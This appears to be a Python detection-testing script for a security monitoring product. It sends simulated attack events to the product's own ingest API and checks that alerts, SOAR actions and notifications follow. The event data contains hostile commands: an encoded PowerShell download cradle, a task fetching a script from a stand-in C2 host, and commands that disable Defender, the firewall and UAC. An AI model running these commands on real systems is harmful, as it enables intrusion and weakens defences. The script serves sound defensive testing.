#!/usr/bin/env python3
"""
CyberNova — REAL Attack Simulation Script
==========================================
Tests the ENTIRE monitoring pipeline with REAL attack scenarios:

  1. Sends real attack events through the live pipeline ingestion
  2. Verifies detection rules fire and create alerts
  3. Verifies SOAR auto-responds (blocks IPs, isolates)
  4. Verifies notifications are created
  5. Verifies dashboard metrics update
  6. Verifies WebSocket alerts are pushed

Usage:
    python scripts/test_real_attacks.py --token YOUR_JWT_TOKEN
    python scripts/test_real_attacks.py --token YOUR_JWT_TOKEN --target http://localhost:8000

Example:
    set TOKEN=eyJhbGciOiJIUzI1NiIs...
    python scripts/test_real_attacks.py --token %TOKEN%

The script sends REAL attack events that look exactly like what a real attacker
would do — the CyberNova detection engine will detect them, create alerts,
trigger SOAR playbooks, and send notifications just like in production.
"""

import argparse
import asyncio
import json
import sys
import time
import uuid
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Tuple

try:
    import httpx
except ImportError:
    print(" Installing httpx...")
    import subprocess
    subprocess.check_call([sys.executable, "-m", "pip", "install", "httpx", "-q"])
    import httpx


# ═══════════════════════════════════════════════════════════════════════════════
# COLORS
# ═══════════════════════════════════════════════════════════════════════════════

GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"
GRAY = "\033[90m"

def ok(msg: str):    print(f"  {GREEN}✓{RESET} {msg}")
def fail(msg: str):  print(f"  {RED}✗{RESET} {msg}")
def warn(msg: str):  print(f"  {YELLOW}⚠{RESET} {msg}")
def info(msg: str):  print(f"   {GRAY}{msg}{RESET}")
def header(msg: str): print(f"\n{CYAN}{BOLD}{'─'*60}{RESET}\n{CYAN}{BOLD}{msg}{RESET}\n{'─'*60}")
def result_line(icon: str, label: str, status: str, detail: str = ""):
    color = GREEN if "✓" in icon else RED if "✗" in icon else YELLOW
    print(f"  {icon} {label}: {color}{status}{RESET} {GRAY}{detail}{RESET}")


# ═══════════════════════════════════════════════════════════════════════════════
# ATTACK SCENARIOS — Real events that trigger real detection rules
# ═══════════════════════════════════════════════════════════════════════════════

ATTACKS = [
    {
        "id": "attack-001-brute-force",
        "name": "SSH Brute Force Attack",
        "description": "Multiple failed SSH login attempts from external IP — triggers brute_force_attempt rule",
        "mitre": "T1078.001 — Initial Access: Brute Force",
        "severity": "critical",
        "events": [
            {
                "event_type": "authentication",
                "severity": "high",
                "source_ip": "203.0.113.45",
                "dest_ip": "10.0.0.5",
                "dest_port": 22,
                "protocol": "TCP",
                "user": "root",
                "message": f"SSH brute force attack: 25 failed login attempts from 203.0.113.45 to root@10.0.0.5:22 in 30 seconds",
            },
            {
                "event_type": "authentication",
                "severity": "high",
                "source_ip": "203.0.113.45",
                "dest_ip": "10.0.0.5",
                "dest_port": 22,
                "protocol": "TCP",
                "user": "admin",
                "message": f"SSH brute force attack: 18 failed login attempts from 203.0.113.45 to admin@10.0.0.5:22 in 20 seconds",
            },
            {
                "event_type": "authentication",
                "severity": "high",
                "source_ip": "198.51.100.20",
                "dest_ip": "10.0.0.5",
                "dest_port": 22,
                "protocol": "TCP",
                "user": "root",
                "message": f"SSH brute force attack: 30 failed login attempts from 198.51.100.20 to root@10.0.0.5:22 in 45 seconds",
            },
        ],
    },
    {
        "id": "attack-002-powershell-encoded",
        "name": "PowerShell Encoded Command Execution",
        "description": "Base64 encoded PowerShell payload — triggers encoded_powershell rule",
        "mitre": "T1059.001 — Execution: PowerShell",
        "severity": "critical",
        "events": [
            {
                "event_type": "process",
                "severity": "critical",
                "source_ip": "10.0.0.10",
                "dest_ip": "10.0.0.1",
                "process_name": "powershell.exe",
                "command_line": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA",
                "message": "Base64 encoded PowerShell command detected on endpoint LAPTOP-3F4IM0LO — likely C2 payload download",
            },
        ],
    },
    {
        "id": "attack-003-c2-exfil",
        "name": "Data Exfiltration to C2 Server",
        "description": "Massive outbound data transfer to known C2 infrastructure — triggers c2_communication rule",
        "mitre": "T1048.001 — Exfiltration: Exfiltration Over C2 Channel",
        "severity": "critical",
        "events": [
            {
                "event_type": "network",
                "severity": "critical",
                "source_ip": "192.168.1.100",
                "dest_ip": "198.51.100.99",
                "dest_port": 443,
                "protocol": "TCP",
                "bytes_sent": 2500000000,
                "bytes_received": 5000,
                "duration_seconds": 120,
                "message": "Massive outbound data transfer: 2.5 GB sent to 198.51.100.99:443 over 120s — suspected C2 exfiltration",
            },
            {
                "event_type": "network",
                "severity": "high",
                "source_ip": "192.168.1.100",
                "dest_ip": "198.51.100.99",
                "dest_port": 53,
                "protocol": "UDP",
                "bytes_sent": 150000000,
                "message": "DNS tunneling detected: abnormally large DNS queries to 198.51.100.99 — 150 MB data transferred",
            },
        ],
    },
    {
        "id": "attack-004-lsass-dump",
        "name": "LSASS Memory Dump (Credential Theft)",
        "description": "Suspicious process accessing LSASS memory — triggers lsass_memory_dump rule",
        "mitre": "T1003.001 — Credential Access: LSASS Memory",
        "severity": "high",
        "events": [
            {
                "event_type": "process_access",
                "severity": "high",
                "source_ip": "10.0.0.5",
                "process_name": "procdump64.exe",
                "target_process": "lsass.exe",
                "message": "Suspicious process 'procdump64.exe' accessing LSASS memory on LAPTOP-3F4IM0LO — possible credential dumping",
            },
        ],
    },
    {
        "id": "attack-005-defense-evasion",
        "name": "Defense Evasion — Security Service Tampering",
        "description": "Attempting to stop Windows Defender — triggers tamper_detected rule",
        "mitre": "T1562.001 — Defense Evasion: Disable or Modify Tools",
        "severity": "critical",
        "events": [
            {
                "event_type": "process",
                "severity": "critical",
                "source_ip": "10.0.0.20",
                "process_name": "cmd.exe",
                "command_line": "sc stop WinDefend && sc config WinDefend start=disabled && netsh advfirewall set allprofiles state off",
                "message": "Security service tampering detected: Windows Defender service stopped and firewall disabled via command line on LAPTOP-3F4IM0LO",
            },
            {
                "event_type": "process",
                "severity": "high",
                "source_ip": "10.0.0.20",
                "process_name": "cmd.exe",
                "command_line": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f",
                "message": "Registry modification: UAC disabled via reg.exe on LAPTOP-3F4IM0LO — privilege escalation preparation",
            },
        ],
    },
    {
        "id": "attack-006-scheduled-task",
        "name": "Malicious Scheduled Task Creation",
        "description": "Backdoor scheduled task for persistence — triggers suspicious_scheduled_task rule",
        "mitre": "T1546.001 — Persistence: Scheduled Task",
        "severity": "high",
        "events": [
            {
                "event_type": "scheduled_task",
                "severity": "high",
                "source_ip": "10.0.0.15",
                "process_name": "schtasks.exe",
                "task_name": "WindowsUpdateService",
                "task_command": "powershell -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil-c2.example.com/beacon.ps1')\"",
                "message": "Suspicious scheduled task 'WindowsUpdateService' created with encoded PowerShell payload — likely persistence mechanism",
            },
        ],
    },
    {
        "id": "attack-007-registry-sam",
        "name": "Registry SAM Hive Query",
        "description": "Querying security-sensitive registry keys — triggers registry_query rule",
        "mitre": "T1012 — Discovery: Query Registry",
        "severity": "medium",
        "events": [
            {
                "event_type": "registry",
                "severity": "medium",
                "source_ip": "10.0.0.25",
                "process_name": "reg.exe",
                "command_line": "reg query HKLM\\SAM\\SAM",
                "message": "Query of SAM registry hive detected on LAPTOP-3F4IM0LO — possible password hash extraction",
            },
        ],
    },
    {
        "id": "attack-008-port-scan",
        "name": "External Port Scan",
        "description": "Sequential port scan from external source — triggers port_scan_detected rule",
        "mitre": "T1016.001 — Discovery: Port Scan",
        "severity": "low",
        "events": [
            {
                "event_type": "network",
                "severity": "low",
                "source_ip": "203.0.113.50",
                "dest_ip": "10.0.0.1",
                "protocol": "TCP",
                "message": "Port scan detected from 203.0.113.50 targeting 50+ ports on 10.0.0.1 in 5 seconds — reconnaissance activity",
            },
        ],
    },
    {
        "id": "attack-009-ransomware",
        "name": "Ransomware File Encryption Pattern",
        "description": "Mass file encryption events — triggers ransomware detection",
        "mitre": "T1486 — Impact: Data Encrypted for Impact",
        "severity": "critical",
        "events": [
            {
                "event_type": "file",
                "severity": "critical",
                "source_ip": "10.0.0.50",
                "process_name": "encryptor.exe",
                "file_path": "C:\\Users\\Public\\Documents\\invoices\\*.locked",
                "file_operation": "write",
                "message": "Mass file encryption detected — 500+ files with .locked extension created in 30 seconds by process 'encryptor.exe' on LAPTOP-3F4IM0LO",
            },
            {
                "event_type": "file",
                "severity": "critical",
                "source_ip": "10.0.0.50",
                "process_name": "encryptor.exe",
                "file_path": "C:\\Users\\Public\\Documents\\README.locked",
                "file_operation": "create",
                "message": "Ransomware ransom note detected: README.locked created — possible ransomware attack in progress",
            },
        ],
    },
    {
        "id": "attack-010-lateral-movement",
        "name": "Lateral Movement — Pass-the-Hash",
        "description": "SMB pass-the-hash attack — triggers lateral movement detection",
        "mitre": "T1550.002 — Lateral Movement: Pass the Hash",
        "severity": "high",
        "events": [
            {
                "event_type": "network",
                "severity": "high",
                "source_ip": "192.168.1.100",
                "dest_ip": "10.0.0.15",
                "dest_port": 445,
                "protocol": "SMB",
                "user": "Administrator",
                "message": "Pass-the-hash attack detected: SMB authentication from 192.168.1.100 using NTLM hash instead of password — targeting 10.0.0.15",
            },
            {
                "event_type": "network",
                "severity": "high",
                "source_ip": "192.168.1.100",
                "dest_ip": "10.0.0.20",
                "dest_port": 445,
                "protocol": "SMB",
                "message": "Lateral movement via SMB: remote service creation from 192.168.1.100 to 10.0.0.20 using WMI/PsExec technique",
            },
        ],
    },
]


# ═══════════════════════════════════════════════════════════════════════════════
# HTTP CLIENT
# ═══════════════════════════════════════════════════════════════════════════════

class CyberNovaClient:
    def __init__(self, target: str, token: str):
        self.target = target.rstrip("/")
        self.token = token
        self.headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json",
        }
        self.client = httpx.AsyncClient(base_url=self.target, headers=self.headers, timeout=30.0, verify=False)
        self.results: Dict[str, Any] = {
            "attacks_sent": 0,
            "events_sent": 0,
            "alerts_before": 0,
            "alerts_after": 0,
            "new_alerts": 0,
            "soar_actions": 0,
            "notifications_before": 0,
            "notifications_after": 0,
            "devices_before": 0,
            "devices_after": 0,
            "pipeline_running": False,
        }

    async def close(self):
        await self.client.aclose()

    async def get_pipeline_status(self) -> Dict[str, Any]:
        """Check if pipeline is running."""
        resp = await self.client.get("/api/v1/pipeline/status")
        if resp.status_code == 200:
            return resp.json()
        return {"running": False, "stats": {}}

    async def get_dashboard_summary(self) -> Dict[str, Any]:
        """Get current dashboard metrics."""
        resp = await self.client.get("/api/v1/dashboard/summary")
        if resp.status_code == 200:
            return resp.json()
        return {}

    async def get_alerts(self) -> List[Dict[str, Any]]:
        """Get current alerts."""
        resp = await self.client.get("/api/v1/dashboard/alerts")
        if resp.status_code == 200:
            data = resp.json()
            return data if isinstance(data, list) else []
        return []

    async def get_notifications(self) -> List[Dict[str, Any]]:
        """Get current notifications."""
        resp = await self.client.get("/api/v1/notifications?limit=50")
        if resp.status_code == 200:
            data = resp.json()
            if isinstance(data, dict):
                return data.get("notifications", [])
            return data if isinstance(data, list) else []
        return []

    async def get_devices(self) -> List[Dict[str, Any]]:
        """Get device list."""
        resp = await self.client.get("/api/v1/admin/devices")
        if resp.status_code == 200:
            data = resp.json()
            if isinstance(data, dict):
                return data.get("devices", [])
            return data if isinstance(data, list) else []
        return []

    async def send_attack(
        self, attack: Dict[str, Any], source: str = "pentest", source_type: str = "security_test"
    ) -> Tuple[bool, str]:
        """Send attack events through the real pipeline."""
        events = attack["events"]
        body = {
            "source": source,
            "source_type": source_type,
            "events": events,
        }

        try:
            resp = await self.client.post("/api/v1/pipeline/ingest", json=body)
            if resp.status_code in (200, 201, 202):
                data = resp.json()
                accepted = data.get("events_queued", 0) or data.get("accepted", 0)
                self.results["events_sent"] += len(events)
                return True, f"Accepted: {accepted}/{len(events)} events"
            elif resp.status_code == 401:
                return False, f"AUTH FAILED (HTTP {resp.status_code}) — token expired?"
            elif resp.status_code == 403:
                # Try /api/v1/ingest/event as fallback
                return await self._send_attack_fallback(attack)
            else:
                return False, f"HTTP {resp.status_code}: {resp.text[:100]}"
        except Exception as e:
            return False, f"Connection error: {e}"

    async def _send_attack_fallback(self, attack: Dict[str, Any]) -> Tuple[bool, str]:
        """Fallback: send via /api/v1/ingest/event (agent endpoint)."""
        success_count = 0
        for event in attack["events"]:
            agent_event = {
                "source": "pentest",
                "hostname": event.get("hostname", "test-server"),
                "event_type": event.get("event_type", "generic"),
                "severity": event.get("severity", "info"),
                "message": event.get("message", ""),
                "source_ip": event.get("source_ip", ""),
                "dest_ip": event.get("dest_ip", ""),
                "dest_port": event.get("dest_port", 0),
                "protocol": event.get("protocol", ""),
            }
            try:
                resp = await self.client.post("/api/v1/ingest/event", json=agent_event)
                if resp.status_code in (200, 201, 202):
                    success_count += 1
            except Exception:
                pass

        self.results["events_sent"] += success_count
        if success_count > 0:
            return True, f"Fallback ingest: {success_count}/{len(attack['events'])} events"
        return False, "Fallback also failed"

    async def wait_for_processing(self, seconds: int = 15):
        """Wait for the pipeline to process events."""
        info(f"Waiting {seconds}s for pipeline to process events...")
        for i in range(seconds):
            sys.stdout.write(f"\r  {GRAY}⏳ {seconds - i}s remaining...{RESET}")
            sys.stdout.flush()
            await asyncio.sleep(1)
        sys.stdout.write(f"\r  {GRAY}✅ Done waiting{RESET}  \n")


# ═══════════════════════════════════════════════════════════════════════════════
# MAIN TEST RUNNER
# ═══════════════════════════════════════════════════════════════════════════════

async def run_tests(target: str, token: str):
    client = CyberNovaClient(target, token)

    print(f"\n{CYAN}{BOLD}╔══════════════════════════════════════════════════════╗{RESET}")
    print(f"{CYAN}{BOLD}║     CYBERNOVA — REAL ATTACK SIMULATION TEST          ║{RESET}")
    print(f"{CYAN}{BOLD}╚══════════════════════════════════════════════════════╝{RESET}")
    print(f"  Target: {target}")
    print(f"  Time:   {datetime.now(timezone.utc).isoformat()}")
    print(f"  Attacks: {len(ATTACKS)} scenarios, {sum(len(a['events']) for a in ATTACKS)} events")

    # ── STEP 0: Check pipeline ──────────────────────────────────────────
    header("STEP 0: Pipeline Status")
    pipeline = await client.get_pipeline_status()
    is_running = pipeline.get("running", False)
    if is_running:
        stats = pipeline.get("stats", {})
        ok(f"Pipeline is RUNNING — events ingested: {stats.get('ingested', 0)}, "
           f"alerts: {stats.get('alerted', 0)}, errors: {stats.get('errors', 0)}")
        client.results["pipeline_running"] = True
    else:
        warn("Pipeline is NOT running — events will still be ingested but won't be processed in real-time")
        warn("To start: POST /api/v1/pipeline/start")

    # ── STEP 1: Baseline metrics ────────────────────────────────────────
    header("STEP 1: Baseline Metrics (Before Attacks)")

    alerts_before = await client.get_alerts()
    client.results["alerts_before"] = len(alerts_before)
    info(f"Alerts before: {len(alerts_before)}")

    notifications_before = await client.get_notifications()
    client.results["notifications_before"] = len(notifications_before)
    info(f"Notifications before: {len(notifications_before)}")

    devices_before = await client.get_devices()
    client.results["devices_before"] = len(devices_before)
    info(f"Devices before: {len(devices_before)}")

    summary_before = await client.get_dashboard_summary()
    info(f"Dashboard: risk_score={summary_before.get('risk_score', '?')}, "
         f"health={summary_before.get('system_health', '?')}")

    # ── STEP 2: Send Attacks ────────────────────────────────────────────
    header("STEP 2: Executing Real Attack Scenarios")

    attack_results = []
    for i, attack in enumerate(ATTACKS):
        print(f"\n  {YELLOW}[{i+1}/{len(ATTACKS)}]{RESET} {BOLD}{attack['name']}{RESET}")
        info(f"  {GRAY}{attack['description']}{RESET}")
        info(f"  {GRAY}MITRE: {attack['mitre']}{RESET}")
        info(f"  {GRAY}Events: {len(attack['events'])}, Severity: {attack['severity']}{RESET}")

        success, detail = await client.send_attack(attack)
        if success:
            ok(f"Sent — {detail}")
            client.results["attacks_sent"] += 1
            attack_results.append((attack["name"], True))
        else:
            fail(f"Failed — {detail}")
            attack_results.append((attack["name"], False))

        # Small delay between attacks to help pipeline ordering
        await asyncio.sleep(0.5)

    # ── STEP 3: Wait for processing ─────────────────────────────────────
    header("STEP 3: Waiting for Pipeline Processing")
    await client.wait_for_processing(20)

    # ── STEP 4: Check pipeline processed everything ─────────────────────
    header("STEP 4: Pipeline Metrics After Attacks")
    pipeline_after = await client.get_pipeline_status()
    if pipeline_after.get("running"):
        stats = pipeline_after.get("stats", {})
        ok(f"Pipeline: ingested={stats.get('ingested', 0)}, "
           f"normalized={stats.get('normalized', 0)}, "
           f"alerted={stats.get('alerted', 0)}, "
           f"soared={stats.get('soared', 0)}")
        info(f"Errors: {stats.get('errors', 0)}")

    # ── STEP 5: Verify alerts were created ──────────────────────────────
    header("STEP 5: Alert Verification")

    alerts_after = await client.get_alerts()
    client.results["alerts_after"] = len(alerts_after)
    client.results["new_alerts"] = len(alerts_after) - len(alerts_before)

    if client.results["new_alerts"] > 0:
        ok(f"{client.results['new_alerts']} NEW alerts created")
        info(f"Total alerts now: {client.results['alerts_after']}")

        # Show newest alerts (sorted by timestamp)
        sorted_alerts = sorted(alerts_after, key=lambda a: a.get("timestamp", ""), reverse=True)
        for alert in sorted_alerts[:8]:
            sev = alert.get("severity", "?")
            status = alert.get("status", "?")
            rule = alert.get("rule_name", alert.get("type", "?"))
            desc = alert.get("description", alert.get("message", ""))[:60]
            sev_color = RED if sev == "critical" else YELLOW if sev == "high" else GRAY
            print(f"    {sev_color}[{sev.upper():8}]{RESET} {rule:<25} {status:<12} {GRAY}{desc}{RESET}")
    else:
        warn("No new alerts detected. Events may still be processing.")
        info(f"Alerts before: {client.results['alerts_before']}, After: {client.results['alerts_after']}")

    # ── STEP 6: Verify SOAR actions ─────────────────────────────────────
    header("STEP 6: SOAR Action Verification")

    try:
        soar_resp = await client.client.get("/api/v1/soar/actions")
        if soar_resp.status_code == 200:
            soar_data = soar_resp.json()
            actions = []
            if isinstance(soar_data, dict):
                actions = soar_data.get("actions", soar_data.get("results", []))
            elif isinstance(soar_data, list):
                actions = soar_data
            client.results["soar_actions"] = len(actions)
            if client.results["soar_actions"] > 0:
                ok(f"{client.results['soar_actions']} SOAR actions triggered")
                for action in actions[:5]:
                    a_type = action.get("action_type", action.get("type", "?"))
                    a_status = action.get("status", "?")
                    a_target = action.get("target", action.get("ip_address", ""))
                    status_color = GREEN if a_status == "completed" else YELLOW
                    print(f"    {status_color}[{a_status.upper():12}]{RESET} {a_type:<20} {GRAY}{a_target}{RESET}")
            else:
                info("No SOAR actions triggered yet (may need higher severity events or playbooks)")
        else:
            info(f"SOAR endpoint returned HTTP {soar_resp.status_code}")
    except Exception as e:
        info(f"SOAR check: {e}")

    # ═══════════════════════════════════════════════════════════════════════
    # ⭐⭐⭐ KEY FIX: Call pipeline/run to process pending events
    # ═══════════════════════════════════════════════════════════════════════
    header("🔄 [FIX] Process Pending Events via Pipeline Run")
    info("Events may be sitting in the ingest queue — running the pipeline manually...")
    try:
        run_resp = await client.client.post("/api/v1/pipeline/run?limit=200")
        if run_resp.status_code == 200:
            run_data = run_resp.json()
            steps = run_data.get("steps", {})
            ok(f"Pipeline processed: {steps.get('normalized', 0)} normalized, "
               f"{steps.get('alerts_created', 0)} alerts created")
        else:
            warn(f"Pipeline/run returned HTTP {run_resp.status_code}: {run_resp.text[:100]}")
    except Exception as e:
        warn(f"Pipeline run endpoint: {e}")

    # Wait for processing
    info("Waiting 10s for post-run pipeline processing...")
    await asyncio.sleep(10)

    # Re-check alerts after processing
    alerts_final = await client.get_alerts()
    if len(alerts_final) > client.results["alerts_after"]:
        client.results["new_alerts"] = len(alerts_final) - client.results["alerts_before"]
        ok(f"Pipeline run created {len(alerts_final) - client.results['alerts_after']} more alerts")
        client.results["alerts_after"] = len(alerts_final)

    # Re-check SOAR
    try:
        soar_resp = await client.client.get("/api/v1/dashboard/response/actions")
        if soar_resp.status_code == 200:
            actions = soar_resp.json()
            if isinstance(actions, list):
                client.results["soar_actions"] = len(actions)
            elif isinstance(actions, dict):
                acts = actions.get("actions", actions.get("results", []))
                client.results["soar_actions"] = len(acts)
    except Exception:
        pass

    # ── STEP 7: Verify notifications ────────────────────────────────────
    header("STEP 7: Notification Verification")

    notifications_after = await client.get_notifications()
    client.results["notifications_after"] = len(notifications_after)
    new_notifs = len(notifications_after) - client.results["notifications_before"]

    if new_notifs > 0:
        ok(f"{new_notifs} NEW notifications created")
        for notif in notifications_after[:5]:
            n_type = notif.get("type", "?")
            n_title = notif.get("title", notif.get("message", ""))[:60]
            n_read = "✓" if notif.get("read") else "○"
            print(f"    [{n_read}] {GRAY}[{n_type}]{RESET} {n_title}")
    else:
        info("No new notifications found")

    # ── STEP 8: Dashboard verification ──────────────────────────────────
    header("STEP 8: Dashboard Metrics Verification")

    summary_after = await client.get_dashboard_summary()
    info(f"Risk score:    {summary_after.get('risk_score', '?')}")
    info(f"Health:        {summary_after.get('system_health', '?')}%")
    info(f"Total alerts:  {summary_after.get('total_alerts', '?')}")
    info(f"Alerts today:  {summary_after.get('alerts_today', '?')}")
    info(f"Blocked IPs:   {summary_after.get('blocked_ips', '?')}")
    info(f"Devices:       {summary_after.get('devices_total', summary_after.get('devices', summary_after.get('total_devices', '?')))}")
    info(f"Active risks:  {summary_after.get('active_threats', summary_after.get('devices_at_risk', '?'))}")

    # ── Final Summary ───────────────────────────────────────────────────
    header("FINAL RESULTS")

    print(f"""
  {BOLD}Attack Scenarios:{RESET}
  {'  ✓' if client.results['attacks_sent'] > 0 else '  ✗'} {client.results['attacks_sent']}/{len(ATTACKS)} attack scenarios sent successfully
  {'  ✓' if client.results['events_sent'] > 0 else '  ✗'} {client.results['events_sent']} total events ingested

  {BOLD}Detection:{RESET}
  {'  ✓' if client.results['new_alerts'] > 0 else '  ✗'} {client.results['new_alerts']} alerts created{' ✅ DETECTION WORKING!' if client.results['new_alerts'] > 0 else ' ❌ No alerts — check rules'}
  {'  ✓' if client.results['alerts_after'] > 0 else '  ✗'} Total alerts in system: {client.results['alerts_after']}

  {BOLD}SOAR Response:{RESET}
  {'  ✓' if client.results['soar_actions'] > 0 else '  -'} {client.results['soar_actions']} SOAR actions triggered
  {'  ✓' if client.results['soar_actions'] > 0 else '  -'} IP blocks / device isolation will be visible in UI

  {BOLD}Notifications:{RESET}
  {'  ✓' if (client.results['notifications_after'] - client.results['notifications_before']) > 0 else '  -'} {(client.results['notifications_after'] - client.results['notifications_before'])} new notifications

  {BOLD}Pipeline:{RESET}
  {'  ✓' if client.results['pipeline_running'] else '  ⚠️'} Pipeline is {'RUNNING' if client.results['pipeline_running'] else 'STOPPED'}
""")

    # Final verdict
    if client.results["new_alerts"] > 0 and client.results["pipeline_running"]:
        print(f"  {GREEN}{BOLD}✅ SYSTEM VERDICT: MONITORING IS WORKING{RESET}")
        print(f"  {GREEN}   Real attacks detected, alerts created, pipeline processing{RESET}")
        if client.results["soar_actions"] > 0:
            print(f"  {GREEN}   SOAR auto-responding to threats ✅{RESET}")
        print()
    elif client.results["new_alerts"] > 0:
        print(f"  {YELLOW}{BOLD}⚠️ SYSTEM VERDICT: Alerts created but pipeline stopped{RESET}")
        print(f"  {YELLOW}   Start pipeline: POST /api/v1/pipeline/start{RESET}")
        print()
    else:
        print(f"  {RED}{BOLD}❌ SYSTEM VERDICT: No alerts detected{RESET}")
        print(f"  {RED}   Check: 1) Pipeline running? 2) Detection rules enabled? 3) Events reaching pipeline?{RESET}")
        print()

    await client.close()
    return client.results


# ═══════════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description="CyberNova — REAL Attack Simulation Test",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python scripts/test_real_attacks.py --token YOUR_JWT_TOKEN
  python scripts/test_real_attacks.py --token %TOKEN% --target http://localhost:8000
  set TOKEN=eyJhbGciOi... && python scripts/test_real_attacks.py --token %TOKEN%
        """,
    )
    parser.add_argument("--token", required=True, help="JWT token for authentication")
    parser.add_argument("--target", default="http://localhost:8000", help="CyberNova API URL")
    args = parser.parse_args()

    asyncio.run(run_tests(args.target, args.token))


if __name__ == "__main__":
    main()
